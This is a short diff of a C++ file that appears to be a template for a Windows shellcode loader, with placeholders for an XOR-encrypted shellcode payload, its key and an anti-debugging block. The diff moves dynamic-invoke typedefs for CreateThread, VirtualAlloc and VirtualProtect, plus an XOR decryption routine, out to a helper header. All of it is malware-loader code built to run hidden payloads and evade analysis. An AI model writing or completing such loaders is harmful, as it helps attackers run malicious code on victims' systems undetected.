@@ -5,44 +5,13 @@
 #include <conio.h> 
 #include <iostream>
 #include <winternl.h>
+#include "helper.h"
 
 <SHELLCODE>
 
 char key[] = <XOR_KEY>;
 unsigned int key_len = sizeof(key);
 unsigned int shellcode_len = sizeof(shellcode);
-
-// Dynamic Invoke nonsense
-typedef HANDLE(*CREATETHREAD)(LPSECURITY_ATTRIBUTES lpThreadAttributes,
-    SIZE_T dwStackSize,
-    LPTHREAD_START_ROUTINE lpStartAddress,
-    LPVOID lpParameter,
-    DWORD dwCreationFlags,
-    LPDWORD lpThreadId
-    );
-
-typedef LPVOID(*VIRTUALALLOC)(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD  flAllocationType,
-    DWORD  flProtect
-    );
-
-typedef BOOL(*VIRTUALPROTECT)(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD  flNewProtect,
-    PDWORD lpflOldProtect
-    );
-
-void xor_data(unsigned char data[], int dataLen, char key[], int keyLen)
-{
-    for (int i = 0; i < dataLen; i++)
-    {
-        //printf("%c\n", data[i] ^ key[i % keyLen]);
-        data[i] = data[i] ^ key[i % (keyLen - 1)];
-    }
-}
 
 
 <ANTI_DEBUG>
